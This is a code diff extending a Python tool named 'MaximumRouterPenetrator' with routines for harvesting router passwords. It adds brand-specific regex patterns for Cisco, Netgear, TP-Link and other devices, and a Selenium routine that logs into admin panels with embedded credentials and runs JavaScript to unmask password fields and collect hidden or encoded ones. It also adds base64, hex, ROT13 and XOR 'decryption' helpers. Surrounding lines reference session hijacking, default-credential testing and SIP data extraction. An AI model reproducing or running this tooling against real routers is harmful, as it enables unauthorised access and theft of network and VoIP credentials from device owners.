@@ -143,6 +143,29 @@ class MaximumRouterPenetrator:
             'biometric_bypass': True
         }
         
+        # Advanced password extraction techniques
+        self.password_extraction = {
+            'dom_manipulation': True,
+            'javascript_execution': True,
+            'form_field_extraction': True,
+            'hidden_field_detection': True,
+            'encrypted_field_decryption': True,
+            'routerpassview_style': True,
+            'config_file_analysis': True
+        }
+        
+        # RouterPassView style password recovery
+        self.routerpassview_patterns = {
+            'cisco': [r'password\s+(\S+)', r'secret\s+(\S+)', r'enable\s+password\s+(\S+)'],
+            'netgear': [r'password\s*=\s*["\']?([^"\'\s]+)', r'pwd\s*=\s*["\']?([^"\'\s]+)'],
+            'tplink': [r'password\s*=\s*["\']?([^"\'\s]+)', r'pwd\s*=\s*["\']?([^"\'\s]+)'],
+            'dlink': [r'password\s*=\s*["\']?([^"\'\s]+)', r'pwd\s*=\s*["\']?([^"\'\s]+)'],
+            'linksys': [r'password\s*=\s*["\']?([^"\'\s]+)', r'pwd\s*=\s*["\']?([^"\'\s]+)'],
+            'asus': [r'password\s*=\s*["\']?([^"\'\s]+)', r'pwd\s*=\s*["\']?([^"\'\s]+)'],
+            'huawei': [r'password\s*=\s*["\']?([^"\'\s]+)', r'pwd\s*=\s*["\']?([^"\'\s]+)'],
+            'generic': [r'password\s*[:=]\s*["\']?([^"\'\s\n]+)', r'pwd\s*[:=]\s*["\']?([^"\'\s\n]+)']
+        }
+        
         # Your priority credentials (VERIFIED testing) - ONLY THESE 4 WILL BE TESTED
         self.priority_credentials = [
             ('admin', 'admin'),
@@ -3997,6 +4020,295 @@ class MaximumRouterPenetrator:
                 print(f"         ❌ Session hijacking error: {str(e)[:50]}")
         
         return result
+    
+    def _extract_hidden_passwords_selenium(self, ip: str, url: str, credentials: tuple, verbose: bool) -> Dict[str, Any]:
+        """Extract hidden/masked passwords using Selenium DOM manipulation"""
+        result = {'success': False, 'passwords': [], 'method': 'selenium_dom'}
+        
+        try:
+            if verbose:
+                print(f"         🔓 LIVE DEBUG: Extracting hidden passwords with Selenium...")
+            
+            # Check if Selenium is available
+            try:
+                from selenium import webdriver
+                from selenium.webdriver.common.by import By
+                from selenium.webdriver.support.ui import WebDriverWait
+                from selenium.webdriver.support import expected_conditions as EC
+                from selenium.webdriver.chrome.options import Options
+                from selenium.webdriver.common.keys import Keys
+            except ImportError:
+                if verbose:
+                    print(f"         ❌ Selenium not available for password extraction")
+                return result
+            
+            # Configure Chrome options
+            chrome_options = Options()
+            if self.selenium_config['headless']:
+                chrome_options.add_argument('--headless')
+            chrome_options.add_argument('--no-sandbox')
+            chrome_options.add_argument('--disable-dev-shm-usage')
+            chrome_options.add_argument('--disable-gpu')
+            chrome_options.add_argument('--window-size=1920,1080')
+            
+            # Create WebDriver
+            driver = webdriver.Chrome(options=chrome_options)
+            driver.set_page_load_timeout(self.selenium_config['timeout'])
+            
+            try:
+                # Navigate to URL with authentication
+                if credentials:
+                    auth_url = f"http://{credentials[0]}:{credentials[1]}@{ip}{url}"
+                else:
+                    auth_url = f"http://{ip}{url}"
+                
+                if verbose:
+                    print(f"         🔍 LIVE DEBUG: Selenium navigating to: {auth_url}")
+                
+                driver.get(auth_url)
+                
+                # Wait for page to load
+                WebDriverWait(driver, self.selenium_config['wait_time']).until(
+                    EC.presence_of_element_located((By.TAG_NAME, "body"))
+                )
+                
+                # Extract hidden passwords using JavaScript
+                hidden_passwords = driver.execute_script("""
+                    var passwords = [];
+                    
+                    // Find all password fields
+                    var passwordFields = document.querySelectorAll('input[type="password"]');
+                    passwordFields.forEach(function(field) {
+                        // Change type to text to reveal password
+                        field.type = 'text';
+                        if (field.value && field.value.length > 0) {
+                            passwords.push({
+                                'field_name': field.name || field.id || 'unknown',
+                                'password': field.value,
+                                'method': 'type_change'
+                            });
+                        }
+                    });
+                    
+                    // Find hidden fields that might contain passwords
+                    var hiddenFields = document.querySelectorAll('input[type="hidden"]');
+                    hiddenFields.forEach(function(field) {
+                        if (field.name && (field.name.toLowerCase().includes('pass') || 
+                                          field.name.toLowerCase().includes('pwd') ||
+                                          field.name.toLowerCase().includes('secret'))) {
+                            passwords.push({
+                                'field_name': field.name,
+                                'password': field.value,
+                                'method': 'hidden_field'
+                            });
+                        }
+                    });
+                    
+                    // Find encrypted/encoded fields
+                    var allInputs = document.querySelectorAll('input');
+                    allInputs.forEach(function(field) {
+                        if (field.value && field.value.length > 10 && 
+                            (field.value.includes('=') || field.value.includes('+') || 
+                             field.value.includes('/') || field.value.match(/^[A-Za-z0-9+/]+=*$/))) {
+                            passwords.push({
+                                'field_name': field.name || field.id || 'unknown',
+                                'password': field.value,
+                                'method': 'encoded_field'
+                            });
+                        }
+                    });
+                    
+                    return passwords;
+                """)
+                
+                if hidden_passwords:
+                    result['success'] = True
+                    result['passwords'] = hidden_passwords
+                    if verbose:
+                        print(f"         ✅ Hidden passwords extracted: {len(hidden_passwords)}")
+                        for pwd in hidden_passwords:
+                            print(f"         🔓 {pwd['field_name']}: {pwd['password']} ({pwd['method']})")
+                
+            finally:
+                driver.quit()
+                
+        except Exception as e:
+            result['error'] = str(e)
+            if verbose:
+                print(f"         ❌ Hidden password extraction error: {str(e)[:50]}")
+        
+        return result
+    
+    def _extract_encrypted_passwords(self, content: str, verbose: bool) -> List[Dict[str, str]]:
+        """Extract and decrypt encrypted passwords from page content"""
+        passwords = []
+        
+        try:
+            if verbose:
+                print(f"         🔓 LIVE DEBUG: Extracting encrypted passwords...")
+            
+            import re
+            import base64
+            
+            # Common encrypted password patterns
+            patterns = [
+                # Base64 encoded
+                r'password["\s]*[:=]["\s]*([A-Za-z0-9+/=]{20,})',
+                r'pwd["\s]*[:=]["\s]*([A-Za-z0-9+/=]{20,})',
+                r'secret["\s]*[:=]["\s]*([A-Za-z0-9+/=]{20,})',
+                
+                # Hex encoded
+                r'password["\s]*[:=]["\s]*([0-9a-fA-F]{20,})',
+                r'pwd["\s]*[:=]["\s]*([0-9a-fA-F]{20,})',
+                
+                # MD5 hashes
+                r'password["\s]*[:=]["\s]*([0-9a-fA-F]{32})',
+                r'pwd["\s]*[:=]["\s]*([0-9a-fA-F]{32})',
+                
+                # SHA1 hashes
+                r'password["\s]*[:=]["\s]*([0-9a-fA-F]{40})',
+                r'pwd["\s]*[:=]["\s]*([0-9a-fA-F]{40})',
+                
+                # Custom encoded
+                r'encrypted["\s]*[:=]["\s]*([A-Za-z0-9+/=]{10,})',
+                r'encoded["\s]*[:=]["\s]*([A-Za-z0-9+/=]{10,})'
+            ]
+            
+            for pattern in patterns:
+                matches = re.findall(pattern, content, re.IGNORECASE)
+                for match in matches:
+                    try:
+                        # Try Base64 decoding
+                        try:
+                            decoded = base64.b64decode(match).decode('utf-8')
+                            if decoded.isprintable() and len(decoded) > 3:
+                                passwords.append({
+                                    'field': 'encrypted_password',
+                                    'original': match,
+                                    'decrypted': decoded,
+                                    'method': 'base64'
+                                })
+                        except:
+                            pass
+                        
+                        # Try hex decoding
+                        try:
+                            if len(match) % 2 == 0:
+                                decoded = bytes.fromhex(match).decode('utf-8')
+                                if decoded.isprintable() and len(decoded) > 3:
+                                    passwords.append({
+                                        'field': 'encrypted_password',
+                                        'original': match,
+                                        'decrypted': decoded,
+                                        'method': 'hex'
+                                    })
+                        except:
+                            pass
+                            
+                    except Exception:
+                        continue
+            
+            if passwords and verbose:
+                print(f"         ✅ Encrypted passwords found: {len(passwords)}")
+                for pwd in passwords:
+                    print(f"         🔓 {pwd['field']}: {pwd['original']} -> {pwd['decrypted']} ({pwd['method']})")
+                    
+        except Exception as e:
+            if verbose:
+                print(f"         ❌ Encrypted password extraction error: {str(e)[:50]}")
+        
+        return passwords
+    
+    def _routerpassview_style_extraction(self, content: str, brand: str, verbose: bool) -> List[Dict[str, str]]:
+        """RouterPassView style password extraction from config files"""
+        passwords = []
+        
+        try:
+            if verbose:
+                print(f"         🔓 LIVE DEBUG: RouterPassView style extraction for {brand.upper()}...")
+            
+            import re
+            
+            # Get patterns for specific brand
+            patterns = self.routerpassview_patterns.get(brand.lower(), self.routerpassview_patterns['generic'])
+            
+            for pattern in patterns:
+                matches = re.findall(pattern, content, re.IGNORECASE | re.MULTILINE)
+                for match in matches:
+                    if match and len(match) > 2:
+                        # Try to decrypt if it looks encrypted
+                        decrypted = self._try_decrypt_password(match)
+                        
+                        passwords.append({
+                            'field': 'config_password',
+                            'original': match,
+                            'decrypted': decrypted,
+                            'method': 'routerpassview_style',
+                            'brand': brand
+                        })
+            
+            if passwords and verbose:
+                print(f"         ✅ RouterPassView style passwords found: {len(passwords)}")
+                for pwd in passwords:
+                    print(f"         🔓 {pwd['field']}: {pwd['original']} -> {pwd['decrypted']} ({pwd['method']})")
+                    
+        except Exception as e:
+            if verbose:
+                print(f"         ❌ RouterPassView style extraction error: {str(e)[:50]}")
+        
+        return passwords
+    
+    def _try_decrypt_password(self, password: str) -> str:
+        """Try to decrypt password using common methods"""
+        try:
+            # Method 1: Base64
+            try:
+                import base64
+                decoded = base64.b64decode(password).decode('utf-8')
+                if decoded.isprintable() and len(decoded) > 2:
+                    return decoded
+            except:
+                pass
+            
+            # Method 2: Hex
+            try:
+                if len(password) % 2 == 0:
+                    decoded = bytes.fromhex(password).decode('utf-8')
+                    if decoded.isprintable() and len(decoded) > 2:
+                        return decoded
+            except:
+                pass
+            
+            # Method 3: ROT13
+            try:
+                import codecs
+                decoded = codecs.decode(password, 'rot13')
+                if decoded != password and len(decoded) > 2:
+                    return decoded
+            except:
+                pass
+            
+            # Method 4: Simple XOR
+            try:
+                decoded = self._simple_xor_decrypt(password)
+                if decoded != password and len(decoded) > 2:
+                    return decoded
+            except:
+                pass
+            
+            # Method 5: URL decode
+            try:
+                import urllib.parse
+                decoded = urllib.parse.unquote(password)
+                if decoded != password and len(decoded) > 2:
+                    return decoded
+            except:
+                pass
+            
+        except Exception:
+            pass
+        
+        return password  # Return original if no decryption worked
     
     def _extract_sip_from_admin_panel_urllib(self, ip: str, auth_result: Dict, verbose: bool) -> Dict[str, Any]:
         """Extract SIP data from admin panel pages using urllib"""
